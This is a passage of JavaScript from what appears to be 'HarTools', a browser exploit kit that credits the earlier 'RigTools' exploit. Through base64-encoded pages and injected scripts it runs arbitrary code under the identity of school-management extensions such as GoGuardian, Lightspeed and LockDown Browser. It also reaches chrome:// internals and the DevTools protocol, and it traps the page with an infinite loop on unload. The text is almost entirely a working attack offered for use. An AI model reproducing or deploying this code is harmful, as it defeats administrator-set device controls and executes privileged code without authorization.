ZXhwbG9zaW9uSW1hZ2Uuc3R5bGUudG9wID0gIjAiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmxlZnQgPSAiMCI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICAgICAgZXhwbG9zaW9uSW1hZ2Uuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOwogICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZXhwbG9zaW9uSW1hZ2UpOwoKICAgICAgICBjb25zdCBleHBsb2RlID0gbmV3IEF1ZGlvKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvYm9vbS5tcDMiKTsKCiAgICAgICAgY29uc3QgY2F0c011c2ljID0gbmV3IEF1ZGlvKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdDNtMW40bC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9pbWcvY2F0cy5tcDMiKTsKICAgICAgICBjYXRzTXVzaWMubG9vcCA9IHRydWU7CgogICAgICAgIGZ1bmN0aW9uIHNob3dFeHBsb3Npb25BbmRQbGF5TXVzaWMoKSB7CgogICAgICAgICAgICBleHBsb3Npb25JbWFnZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsKCiAgICAgICAgICAgIGV4cGxvZGUucGxheSgpOwogICAgICAgICAgICBjYXRzTXVzaWMucGxheSgpOwoKICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGV4cGxvc2lvbkltYWdlLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgICAgICAgICAgIH0sIDE1MDApOwoKICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIGV4cGxvZGUucGF1c2UoKTsKICAgICAgICAgICAgICAgIGV4cGxvZGUuY3VycmVudFRpbWUgPSAwOwogICAgICAgICAgICB9LCAxNTAwKTsKICAgICAgICB9CgogICAgICAgIHNob3dFeHBsb3Npb25BbmRQbGF5TXVzaWMoKTsKCiAgICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmIChvblRhYikgewogICAgICAgIGNvZGUgPSBjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0ID8KICAgICAgICAgICAgYDtjaHJvbWUudGFicy5leGVjdXRlU2NyaXB0KAogICAgICAgICAgJHt0YWJJZH0sCiAgICAgICAgICB7IGNvZGU6ICR7SlNPTi5zdHJpbmdpZnkoY29kZSl9IH0KICAgICAgICApYCA6CiAgICAgICAgICAgIGNocm9tZS5zY3JpcHRpbmcgPwogICAgICAgICAgICBgY2hyb21lLnNjcmlwdGluZy5leGVjdXRlU2NyaXB0KHsKICAgICAgICAgIHRhcmdldDoge3RhYklkOiAke3RhYklkfX0sCiAgICAgICAgICBmdW5jOiAoKSA9PiB7JHtjb2RlfX0KICAgICAgICB9KTtgIDoKICAgICAgICAgICAgYGFsZXJ0KCJzb21ldGhpbmcgd2VudCB3cm9uZywgcnVuQ29kZSB3YXMgZXhlY3V0ZWQgb24gYSB0YWIgd2l0aG91dCBwcm9wZXIgcGVybWlzc2lvbnMiKWA7CiAgICB9CgogICAgdHJ5IHsKICAgICAgICBjb25zdCBvcmlnaW5hbExvZyA9IGNvbnNvbGUubG9nOwogICAgICAgIGNvbnNvbGUubG9nID0gKC4uLmFyZ3MpID0+IHsKICAgICAgICAgICAgb3V0cHV0RGl2LmlubmVySFRNTCArPSBhcmdzLmpvaW4oIiAiKSArICI8YnI+IjsKICAgICAgICB9OwoKICAgICAgICBjb25zdCBmcyA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZ2V0RlMoKTsKCiAgICAgICAgZnVuY3Rpb24gd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgic3JjLmpzIiwgY29kZSk7CiAgICAgICAgbGV0IHNjcmlwdCA9CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V2YWx1YXRlX2VsZW0iKSA/PwogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQucmVtb3ZlKCk7CiAgICAgICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LmlkID0gImV2YWx1YXRlX2VsZW0iOwogICAgICAgIHNjcmlwdC5zcmMgPSB1cmw7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwoKICAgICAgICBjb25zb2xlLmxvZyA9IG9yaWdpbmFsTG9nOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBvdXRwdXREaXYuaW5uZXJIVE1MID0gYEVycm9yOiAke2Vycm9yfWA7CiAgICB9Cn07`))
                    const url = await writeFile('index.html', `${atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgPHRpdGxlPkV4dGVuc2lvbiBFdmFsdWF0aW9uIC0gSGFyVG9vbHM8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8ZGl2IGlkPSJwYXJ0aWNsZXMtanMiPjwvZGl2PgogIDxkaXYgY2xhc3M9Im1haW4iPgogICAgPGgxPk5vIHBheWxvYWRzIGFyZSBhdmFpbGFibGU8L2gxPgogICAgPHA+Tm8gcGF5bG9hZHMgY3VycmVudGx5IGF2YWlsYWJsZSBmb3IgeW91ciBleHRlbnNpb24uIFRyeSBhbm90aGVyIGV4dGVuc2lvbi4KICAgICAgV2UgYXJlIGN1cnJlbnRseSBkZXZlbG9waW5nIHBheWxvYWRzIGZvciBvdGhlciBBUElzLjwvcD4KICAgIDxwPkF2YWlsYWJsZSBwYXlsb2FkcyBmb3IgcGVybWlzc2lvbnM6PC9wPgogICAgPHVsPgogICAgICA8bGk+bWFuYWdlbWVudDwvbGk+CiAgICA8L3VsPgogIDwvZGl2PgogIAogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWUyMDMwOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGEgewogICAgICBjb2xvcjogI2I3YmRmODsKICAgIH0KCiAgICAubWFpbiB7CiAgICAgIHRvcDogNTAlOwogICAgICBsZWZ0OiA1MCU7CiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSk7CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkIHdoaXRlOwogICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgcGFkZGluZzogNSU7CiAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzI0MjczYTsKICAgIH0KCiAgICAuYnV0dG9uIHsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2E2ZGE5NTsKICAgICAgYm9yZGVyOiBub25lOwogICAgICBjb2xvcjogd2hpdGU7CiAgICAgIHBhZGRpbmc6IDEwcHggMjBweDsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICBtYXJnaW46IDRweCAycHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgfQoKICAgIHVsIHsKICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICBtYXJnaW46IDA7CiAgICAgIHBhZGRpbmc6IDA7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgfQogIDwvc3R5bGU+CjwvYm9keT4KCjwvaHRtbD4=')}<script src="./index.js" ></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });


                // }, 5000);

            }
            document.open();
            document.write(atob(`PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIC8+CiAgICA8dGl0bGU+RGFzaGJvYXJkPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CgogICAgICBib2R5IHsKICAgICAgICBmb250LWZhbWlseTogJ0dlaXN0Jywgc2Fucy1zZXJpZjsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjAyMTI0OwogICAgICAgIGNvbG9yOiAjZThlYWVkOwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICB9CgogICAgICAubWFpbiB7CiAgICAgICAgbWF4LXdpZHRoOiA5MDBweDsKICAgICAgICBtYXJnaW46IDUwcHggYXV0bzsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMmIyYjJiOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICAgICAgcGFkZGluZzogMzBweDsKICAgICAgICBib3gtc2hhZG93OiAwIDFweCAzcHggcmdiYSgwLCAwLCAwLCAwLjUpOwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMzYzQwNDM7CiAgICAgICAgdHJhbnNpdGlvbjogYm94LXNoYWRvdyAwLjNzIGVhc2UsIGJvcmRlci1jb2xvciAwLjNzIGVhc2U7CiAgICAgIH0KCiAgICAgIC5tYWluOmhvdmVyIHsKICBib3gtc2hhZG93OiAwIDAgMTBweCAycHggIzhhMmJlMiwgMCAwIDIwcHggNHB4ICM4YTJiZTI7CiAgYm9yZGVyLWNvbG9yOiAjOGEyYmUyOwogICAgICB9CgogICAgICAuaGVhZGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICB9CgogICAgICAubG9nbyB7CiAgICAgICAgd2lkdGg6IDMuNWVtOwogICAgICAgIGhlaWdodDogYXV0bzsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICB9CgogICAgICBoMSB7CiAgICAgICAgZm9udC1zaXplOiAyLjJlbTsKICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgY29sb3I6ICNiYjg2ZmM7CiAgICAgIH0KCiAgICAgIHAgewogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgICBsaW5lLWhlaWdodDogMS42OwogICAgICAgIGNvbG9yOiAjZGFkY2UwOwogICAgICB9CgogICAgICBhIHsKICAgICAgICBjb2xvcjogI2JiODZmYzsKICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICAgICAgfQoKICAgICAgYTpob3ZlciB7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICB9CgogICAgICAuYnV0dG9uIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOGEyYmUyOwogICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICBwYWRkaW5nOiA4cHggMTRweDsKICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgbWFyZ2luOiA2cHggNHB4OwogICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNnB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjJzIGVhc2U7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICB9CgogICAgICAuYnV0dG9uOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjYTA2NmY1OwogICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMS4wNSk7CiAgICAgIH0KCiAgICAgIC5idXR0b246Zm9jdXMgewogICAgICAgIG91dGxpbmU6IG5vbmU7CiAgICAgIH0KCiAgICAgIGlucHV0LAogICAgICBzZWxlY3QsCiAgICAgIHRleHRhcmVhIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzAzMTM0OwogICAgICAgIGNvbG9yOiAjZThlYWVkOwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICM1ZjYzNjg7CiAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTVweDsKICAgICAgfQoKICAgICAgaW5wdXQ6Zm9jdXMsCiAgICAgIHNlbGVjdDpmb2N1cywKICAgICAgdGV4dGFyZWE6Zm9jdXMgewogICAgICAgIGJvcmRlci1jb2xvcjogI2JiODZmYzsKICAgICAgICBvdXRsaW5lOiBub25lOwogICAgICB9CgogICAgICA6OnBsYWNlaG9sZGVyIHsKICAgICAgICBjb2xvcjogIzlhYTBhNjsKICAgICAgfQoKICAgICAgaHIgewogICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICBib3JkZXItdG9wOiAxcHggc29saWQgIzNjNDA0MzsKICAgICAgICBtYXJnaW46IDIwcHggMDsKICAgICAgfQoKICAgICAgLmJhY2tncm91bmQtZ3JpZCB7CiAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgIHRvcDogMDsKICAgICAgICBsZWZ0OiAwOwogICAgICAgIHJpZ2h0OiAwOwogICAgICAgIGJvdHRvbTogMDsKICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiByYWRpYWwtZ3JhZGllbnQoIzMwMzEzNCAxcHgsIHRyYW5zcGFyZW50IDFweCk7CiAgICAgICAgYmFja2dyb3VuZC1zaXplOiAycmVtIDJyZW07CiAgICAgICAgei1pbmRleDogLTE7CiAgICAgICAgYW5pbWF0aW9uOiBtb3ZlR3JpZCA0cyBsaW5lYXIgaW5maW5pdGU7CiAgICAgIH0KCiAgICAgIEBrZXlmcmFtZXMgbW92ZUdyaWQgewogICAgICAgIDAlIHsKICAgICAgICAgIGJhY2tncm91bmQtcG9zaXRpb246IDAgMDsKICAgICAgICB9CiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KICAgICAgICBpZnJhbWUgewogICAgICAgICAgICB3aWR0aDogMDsKICAgICAgICAgICAgaGVpZ2h0OiAwOwogICAgICAgICAgICBib3JkZXI6IDA7CiAgICAgICAgICAgIHZpc2liaWxpdHk6IGhpZGRlbjsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICAgICAgICBsZWZ0OiAtOTk5OXB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPGRpdiBjbGFzcz0iYmFja2dyb3VuZC1ncmlkIj48L2Rpdj4KICAgIDxkaXYgY2xhc3M9Im1haW4iPgogICAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgICAgIDxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY3Jvc3NqYmx5L0hhclRvb2xzLXJpZ3Rvb2xzMTI4cGx1cy9yZWZzL2hlYWRzL21haW4vaGFydG9vbHMuZ2lmIiBhbHQ9IkhhclRvb2xzIExvZ28iIGNsYXNzPSJsb2dvIiAvPgogICAgICAgIDxoMT5IYXJUb29sczwvaDE+CiAgICAgICAgPHA+RGV2ZWxvcGVyIFRvb2xzIGFuZCBFeHRlbnNpb24gQ29kZSBleGVjdXRpb248L3A+CiAgICAgIDwvZGl2PgoKICAgICAgPHA+VGhpcyB3YXMgZm91bmQgYnkgPGEgaHJlZj0iaHR0cHM6Ly9jcm9zc2pibHkucGFnZXMuZGV2LyI+Y3Jvc3NqYmx5PC9hPjxicj4KICAgICAgT3JpZ2luYWwgUmlnVG9vbHMgRXhwbG9pdCB3YXMgZm91bmQgYnkgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0ZXU21hc2hlciI+RldTbWFzaGVyPC9hPjwvcD4KICAgICAgPGhyPgogICAgICA8cD5BS0E6IGlmIHNvbWVvbmUgdGVsbHMgeW91IHRoYXQgdGhleSBtYWRlIHRoaXMsIHRoZXkncmUgbHlpbmcgYW5kIHlvdSBzaG91bGQgbGF1Z2ggYXQgdGhlbTwvcD4KICAgICAgPGhyPgogICAgICA8cD5BZGRpdGlvbmFsIGNyZWRpdHM6IERpc2NvcmQ6IEBheHFteCAodGVzdGluZyBhbmQgaGVscGluZyB3aXRoIGRldmVsb3BtZW50KSBAcHdlbiAoaWRlYXMpIHwgR2l0aHViOgogICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9GV1NtYXNoZXIiPkZXU21hc2hlcjwvYT4sCiAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0Jsb2JieS1Cb2kiPkJsb2JieSBCb2k8L2E+CiAgICAgIDwvcD4KICAgICAgPGhyPgoKICAgICAgPHA+UHJlc3MgUSBmb3IgZXZhbHVhdGluZyBjb2RlIHVuZGVyIDxhIGNsYXNzPSJidXR0b24iIGlkPSJleHRkYmciIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+ZXh0ZW5zaW9uIGlkPC9hPjwvcD4KICAgICAgPHA+T3IgcHJlc3MgMS05IGZvciBzb21lIGhhcmRjb2RlZCBleHRlbnNpb25zPC9wPgogICAgICA8cD4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5scyBmaWx0ZXI8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iaHBrZG9rYWtqZ2xwcGVla2ZlZWttZWJmYWhhZG5mbHAiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+bHMgYWxlcnQ8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0iaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+Z29ndWFyZGlhbjwvYT4KICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIGhhcmRjb2RlZCIgZXh0PSJtb2Voa2JiY2JrbG1rY2ppYmNiYm9vZWJncG9nZWpvYyIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIj5hcmlzdG90bGU8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ia21mZmVoYmlkbGFsaWJmZWtsYWVmbmNrcGlkYm9kZmYiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+aWJvc3M8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ibWxvYWpmbm1qY2tmamJlZW9mY2RhZWNiZWxuYmxkZW4iIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+c25hcCZyZWFkPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImZvZ2plYW5qZmJpb21iZ2hubWttbW9waGZlY2NqZGtpIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmxvY2tkb3duIGJyb3dzZXI8L2E+CiAgICAgICAgPGEgY2xhc3M9ImJ1dHRvbiBoYXJkY29kZWQiIGV4dD0ia21wamxpbG5lbWpjaW9oamNramFkbWdtaWNvbGRnbGYiIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSI+ZHlrbm93IGNsb3VkPC9hPgogICAgICAgIDxhIGNsYXNzPSJidXR0b24gaGFyZGNvZGVkIiBleHQ9ImduZG1oZGNlZmJobGNoa2hpcGNubmJrY21pY25jZWhrIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmdmb3JtcyBsb2NrZWQgbW9kZSAoZW5yb2xsZWQgY2JzKTwvYT4KICAgICAgPC9wPgoKICAgICAgPHA+UHJlc3MgTSBmb3IgZXZhbHVhdGluZyB1bmRlciA8YSBjbGFzcz0iYnV0dG9uIiBpZD0iZGV2ZGJnIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiPmRldnRvb2xzPC9hPiBjb250ZXh0PC9wPgogICAgICA8cD5UeXBpbmcgY2FuY2VsIGluIGFueSBwcm9tcHQgd2lsbCBjYW5jZWwgdGhlIGN1cnJlbnQgb3BlcmF0aW9uLjwvcD4KCiAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9ImRldnRvb2xzOi8vZGV2dG9vbHMvYnVuZGxlZC9pbnNwZWN0b3IuaHRtbD9leHBlcmltZW50cz10cnVlIj5SZS1vcGVuIGRldnRvb2xzPC9hPgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJ1cGRhdGVyIj5VcGRhdGUgcGF5bG9hZDwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iY2xlYW51cCI+Q2xlYW51cCBhbmQgcmVzZXQgZm9yIGV4dGVuc2lvbjwvYT4KICAgICAgPGEgY2xhc3M9ImJ1dHRvbiIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0iYWN0aXZhdGUiPkNocm9tZSBVUkxzPC9hPgogICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJhY3RpdmF0ZTIiPkNocm9tZSBVUkxzIDI8L2E+CiAgICA8L2Rpdj4KCiAgICA8c2NyaXB0IGRlZmVyPgogICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICAgICAgICBpZiAoZXZlbnQua2V5ID09PSAicSIpIHsKICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJleHRkYmciKS5jbGljaygpOwogICAgICAgIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAibSIpIHsKICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkZXZkYmciKS5jbGljaygpOwogICAgICAgIH0gZWxzZSBpZiAoWyIxIiwgIjIiLCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSJdLmluY2x1ZGVzKGV2ZW50LmtleSkpIHsKICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoYC5oYXJkY29kZWRgKVtwYXJzZUludChldmVudC5rZXkpIC0gMV0/LmNsaWNrKCk7CiAgICAgICAgfQogICAgICB9KTsKICAgIDwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg==`));
            document.querySelector('#activate').onclick = function () {
                dbgext(false, pdfId);
            }
            onunload = function () {
                while (true);
            }
            document.close();
            document.title = "Dashboard";
            document.querySelector('#activate2').onclick = function (ev) {

                function xd(w) {
                    w.close();
                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                    chrome.tabs.getCurrent(function (tab) {
                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

